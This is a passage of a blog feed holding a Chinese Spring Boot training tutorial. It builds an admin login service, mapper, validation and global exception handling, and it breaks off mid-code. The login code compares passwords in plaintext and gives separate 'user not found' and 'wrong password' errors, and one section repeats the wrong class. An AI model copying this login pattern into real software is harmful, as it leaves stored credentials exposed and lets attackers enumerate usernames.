            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训day5</title>
      <link href="/2021/06/04/shi-xun-day5/"/>
      <url>/2021/06/04/shi-xun-day5/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring入门4"><a href="#Spring入门4" class="headerlink" title="Spring入门4"></a>Spring入门4</h1><p>项目代码:<a href="https://gitee.com/laobameishijia/guoxinan-practical-training">https://gitee.com/laobameishijia/guoxinan-practical-training</a></p><ul><li><a href="#spring%E5%85%A5%E9%97%A84">Spring入门4</a><ul><li><a href="#%E7%AE%80%E5%8D%95%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E5%AE%9E%E7%8E%B0">简单登录页面实现</a><ul><li><a href="#%E9%A2%84%E6%9C%9F%E6%95%88%E6%9E%9C">预期效果</a></li><li><a href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF">实现思路</a></li><li><a href="#%E5%AE%9E%E7%8E%B0%E8%BF%87%E7%A8%8B">实现过程</a><ul><li><a href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E5%B9%B6%E5%AE%9E%E7%8E%B0">创建服务接口，并实现</a></li><li><a href="#%E5%86%99%E5%A5%BDmapper%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2">写好mapper,进行数据查询</a></li><li><a href="#%E6%8E%A7%E5%88%B6%E5%99%A8%E6%B3%A8%E5%86%8C%E6%9C%8D%E5%8A%A1%E4%BC%A0%E5%8F%82">控制器注册服务，传参</a></li></ul></li></ul></li><li><a href="#springboot%E6%95%B0%E6%8D%AE%E6%A0%A1%E9%AA%8C">Springboot数据校验</a><ul><li><a href="#%E6%90%9E%E6%B8%85%E6%A5%9A%E4%BB%80%E4%B9%88%E6%98%AF%E9%9D%A2%E5%90%91%E5%88%87%E9%9D%A2%E7%BC%96%E7%A8%8B">搞清楚什么是面向切面编程</a></li><li><a href="#%E5%AE%9E%E4%BD%93%E7%B1%BB----%E5%86%99%E4%B8%8A%E7%9B%B8%E5%85%B3%E6%B3%A8%E8%A7%A3">实体类—-写上相关注解</a></li><li><a href="#%E6%A0%A1%E9%AA%8C%E7%B1%BB----%E6%A3%80%E9%AA%8C%E6%95%B0%E6%8D%AE%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8%E7%94%B1%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BB%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86">校验类—-检验数据、抛出异常,由异常处理类进行处理</a></li><li><a href="#%E6%8E%A7%E5%88%B6%E5%99%A8----%E5%B0%86%E5%89%8D%E7%AB%AF%E4%BC%A0%E5%85%A5%E6%95%B0%E6%8D%AE%E4%BC%A0%E7%BB%99%E6%A0%A1%E9%AA%8C%E7%B1%BB%E8%BF%9B%E8%A1%8C%E6%A0%A1%E9%AA%8C">控制器—-将前端传入数据传给校验类进行校验</a></li></ul></li><li><a href="#springboot%E5%85%A8%E5%B1%80%E5%BC%82%E5%B8%B8">Springboot全局异常</a><ul><li><a href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BB">异常处理类</a></li><li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8--%E4%BB%A5%E7%99%BB%E5%BD%95%E5%BC%82%E5%B8%B8%E4%B8%BA%E4%BE%8B">自定义异常–以登录异常为例</a></li><li><a href="#%E5%9C%A8%E6%9C%8D%E5%8A%A1%E4%B8%AD%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8">在服务中抛出异常</a></li></ul></li><li><a href="#spring%E6%8B%A6%E6%88%AA%E5%99%A8">Spring拦截器</a><ul><li><a href="#%E7%99%BB%E5%BD%95%E6%8B%A6%E6%88%AA%E5%99%A8">登录拦截器</a></li><li><a href="#%E6%B3%A8%E5%86%8C%E6%8B%A6%E6%88%AA%E5%99%A8">注册拦截器</a></li></ul></li></ul></li></ul><h2 id="简单登录页面实现"><a href="#简单登录页面实现" class="headerlink" title="简单登录页面实现"></a>简单登录页面实现</h2><h3 id="预期效果"><a href="#预期效果" class="headerlink" title="预期效果"></a>预期效果</h3><ul><li>登录成功，进入主页—登录成功</li><li>登录失败：告诉用户具体错误–用户不存在、密码不正确、登录失败</li><li>退出登录，提示用户是否退出，点击是删除session退出登录。</li></ul><h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ul><li>处理持久层—(操作数据库的Mapper)的代码：查询—findByName(String adminName) 找不到—提示用户不存在</li><li>处理登录业务逻辑(服务Service)—-实现登录失败、密码不正确几种情况的逻辑。</li><li>控制层—-路由控制、结果返回</li><li>表现层(视图、网页)—-ajax异步请求、Session保留会话</li></ul><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210605102000.png" alt="20210605102000"></p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><h4 id="创建服务接口，并实现"><a href="#创建服务接口，并实现" class="headerlink" title="创建服务接口，并实现"></a>创建服务接口，并实现</h4><p>接口：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">LoginService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 用户登录     * @param admin     * @return     */</span>    <span class="token class-name">JsonData</span> login <span class="token punctuation">(</span><span class="token class-name">Admin</span> admin<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">JsonData</span> exit <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实现：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">LoginService</span> <span class="token punctuation">&#123;</span>        <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">AdminMapper</span> mapper<span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span>  <span class="token class-name">JsonData</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token class-name">Admin</span> admin<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">//数据校验</span>                <span class="token comment">//从数据库中查数据</span>        <span class="token class-name">Admin</span> dbAdmin <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">findoneByName</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span><span class="token function">getAdminName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dbAdmin <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//说明用户不存在</span><span class="token comment">//            return new JsonData(1001,"用户不存在");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token number">1001</span><span class="token punctuation">,</span><span class="token string">"用户不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">//判断状态</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">.</span><span class="token function">getAdminStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">.</span><span class="token function">getAdminStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//            return new JsonData(1001,"用户被锁定,联系管理员");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token number">1002</span><span class="token punctuation">,</span><span class="token string">"用户被锁定,联系管理员"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>                <span class="token comment">//判断密码正确</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>dbAdmin<span class="token punctuation">.</span><span class="token function">getAdminPwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span><span class="token function">getAdminPwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//            return new JsonData(1001,"密码错误");</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">LoginException</span><span class="token punctuation">(</span><span class="token number">1003</span><span class="token punctuation">,</span><span class="token string">"密码错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//存到session</span>        session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"adminName"</span><span class="token punctuation">,</span>admin<span class="token punctuation">.</span><span class="token function">getAdminName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//更新用户最后登录时间</span>        dbAdmin<span class="token punctuation">.</span><span class="token function">setLastLoginTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Timestamp</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//dbAdmin没有问题</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>dbAdmin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JsonData</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"登录正常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span>  <span class="token class-name">JsonData</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        request<span class="token punctuation">.</span><span class="token function">getSession</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invalidate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JsonData</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"退出正常"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="写好mapper-进行数据查询"><a href="#写好mapper-进行数据查询" class="headerlink" title="写好mapper,进行数据查询"></a>写好mapper,进行数据查询</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * 主要用来操作数据库，增删改查 */</span><span class="token annotation punctuation">@Mapper</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">AdminMapper</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 查询所有数据     */</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Admin</span><span class="token punctuation">></span></span> <span class="token function">findAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Admin</span><span class="token punctuation">></span></span> <span class="token function">fineByParam</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"param"</span><span class="token punctuation">)</span> <span class="token class-name">MyParam</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     *增加     * @param admin     */</span>    <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token class-name">Admin</span> admin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 真删除     */</span>    <span class="token keyword">void</span> <span class="token function">deleteTrue</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"delete"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 更新     * @param admin     */</span>    <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token class-name">Admin</span> admin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 软删除     * @param id     */</span>    <span class="token keyword">void</span> <span class="token function">deleteFalse</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 查询单条数据     * @param id     */</span>    <span class="token class-name">Admin</span> <span class="token function">findone</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> <span class="token class-name">Integer</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 通过用户名查询对应的用户     * @param name     * @return     */</span>    <span class="token class-name">Admin</span> <span class="token function">findoneByName</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 批量插入     */</span>    <span class="token keyword">int</span> <span class="token function">insertBatch</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"adminList"</span><span class="token punctuation">)</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Admin</span><span class="token punctuation">></span></span> adminList<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/**     * 批量删除     * @param adminList     * @return     */</span>    <span class="token keyword">int</span> <span class="token function">deleteBatch</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"adminList"</span><span class="token punctuation">)</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Admin</span><span class="token punctuation">></span></span> adminList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="控制器注册服务，传参"><a href="#控制器注册服务，传参" class="headerlink" title="控制器注册服务，传参"></a>控制器注册服务，传参</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">LoginServiceImpl</span> loginService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/page"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/verify"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span><span class="token comment">//不需要进行页面跳转而是直接返回数据。</span>    <span class="token comment">//添加了@ResponseBody注解的方法，返回值会通过HTTP响应主体直接发送给浏览器。</span>    <span class="token keyword">public</span> <span class="token class-name">JsonData</span> <span class="token function">verifyLogin</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Validated</span> <span class="token class-name">Admin</span> admin<span class="token punctuation">,</span> <span class="token class-name">BindingResult</span> result<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//数据校验</span>        <span class="token comment">//获取所有错误</span>        <span class="token class-name">ValidatorUtil</span><span class="token punctuation">.</span><span class="token function">showMsg</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> loginService<span class="token punctuation">.</span><span class="token function">login</span><span class="token punctuation">(</span>admin<span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/exit"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span><span class="token comment">//不需要进行页面跳转而是直接返回数据。</span>    <span class="token comment">//添加了@ResponseBody注解的方法，返回值会通过HTTP响应主体直接发送给浏览器。</span>    <span class="token keyword">public</span> <span class="token class-name">JsonData</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> loginService<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Springboot数据校验"><a href="#Springboot数据校验" class="headerlink" title="Springboot数据校验"></a>Springboot数据校验</h2><h3 id="搞清楚什么是面向切面编程"><a href="#搞清楚什么是面向切面编程" class="headerlink" title="搞清楚什么是面向切面编程"></a>搞清楚什么是面向切面编程</h3><p>AOP技术利用一种称为“横切”的技术，剖解开封装对象的内部，将影响多个类的公共行为封装到一个可重用的模块中，并将其命名为Aspect切面。所谓的切面，简单来说就是与业务无关，却为业务模块所共同调用的逻辑，将其封装起来便于减少系统的重复代码，降低模块的耦合度，有利用未来的可操作性和可维护性。</p><p>例如：银行系统的取款流程和查询余额的流程</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20210605095214.png" alt="20210605095214"></p><p>hibernate validator 加几个注释，由后端检验<br>一般来说，Web应用都是前后端都会对数据进行校验，前端一般是用js正则进行校验，后端主要是对传入接口的数据进行校验，不能对一些无效的数据产生返回。</p><h3 id="实体类—-写上相关注解"><a href="#实体类—-写上相关注解" class="headerlink" title="实体类—-写上相关注解"></a>实体类—-写上相关注解</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Admin</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>  <span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"用户名不能为空！"</span><span class="token punctuation">)</span>  <span class="token keyword">private</span> <span class="token class-name">String</span> adminName<span class="token punctuation">;</span>  <span class="token annotation punctuation">@NotBlank</span><span class="token punctuation">(</span>message <span class="token operator">=</span> <span class="token string">"密码不能为空"</span><span class="token punctuation">)</span>  <span class="token keyword">private</span> <span class="token class-name">String</span> adminPwd<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Long</span> adminPhone<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Timestamp</span> lastLoginTime<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Timestamp</span> createTime<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Timestamp</span> updateTime<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Integer</span> adminStatus<span class="token punctuation">;</span>  <span class="token keyword">private</span> <span class="token class-name">Integer</span> isDeleted<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="校验类—-检验数据、抛出异常-由异常处理类进行处理"><a href="#校验类—-检验数据、抛出异常-由异常处理类进行处理" class="headerlink" title="校验类—-检验数据、抛出异常,由异常处理类进行处理"></a>校验类—-检验数据、抛出异常,由异常处理类进行处理</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ValidatorUtil</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 展示错误信息     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">showMsg</span><span class="token punctuation">(</span><span class="token class-name">BindingResult</span> result<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ObjectError</span><span class="token punctuation">></span></span> allErrors <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getAllErrors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ObjectError</span> error <span class="token operator">:</span> allErrors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span>  <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span><span class="token function">getDefaultMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="控制器—-将前端传入数据传给校验类进行校验"><a href="#控制器—-将前端传入数据传给校验类进行校验" class="headerlink" title="控制器—-将前端传入数据传给校验类进行校验"></a>控制器—-将前端传入数据传给校验类进行校验</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ValidatorUtil</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 展示错误信息     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">showMsg</span><span class="token punctuation">(</span><span class="token class-name">BindingResult</span> result<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ObjectError</span><span class="token punctuation">></span></span> allErrors <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getAllErrors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ObjectError</span> error <span class="token operator">:</span> allErrors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span>  <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span>error<span class="token punctuation">.</span><span class="token function">getDefaultMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Springboot全局异常"><a href="#Springboot全局异常" class="headerlink" title="Springboot全局异常"></a>Springboot全局异常</h2><p>着重去理解异常类抛出和处理的顺序。抛出了哪个是由哪个类处理，往调用者抛出????</p><p>SpringBoot中有一个<code>ControllerAdvice</code>的注解，使用该注解表示开启了全局异常的捕获，我们只需在自定义一个方法使用<code>ExceptionHandler</code>注解然后定义捕获异常的类型即可对这些捕获的异常进行统一的处理。非常方便后续异常的分类处理以及代码维护</p><h3 id="异常处理类"><a href="#异常处理类" class="headerlink" title="异常处理类"></a>异常处理类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestControllerAdvice</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyExceptionAdvice</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/**     * 专门用于处理登录异常     * @param e     * @return     */</span>    <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">LoginException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">JsonData</span> <span class="token function">loginExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">LoginException</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JsonData</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token annotation punctuation">@ExceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">Exception</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">JsonData</span>  <span class="token function">exceptionHandler</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//记录异常日志</span>        <span class="token comment">//异常日志对于系统非常重要</span>                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">JsonData</span><span class="token punctuation">(</span><span class="token number">1002</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自定义异常–以登录异常为例"><a href="#自定义异常–以登录异常为例" class="headerlink" title="自定义异常–以登录异常为例"></a>自定义异常–以登录异常为例</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LoginException</span> <span class="token keyword">extends</span> <span class="token class-name">RuntimeException</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Integer</span> code<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> msg<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token 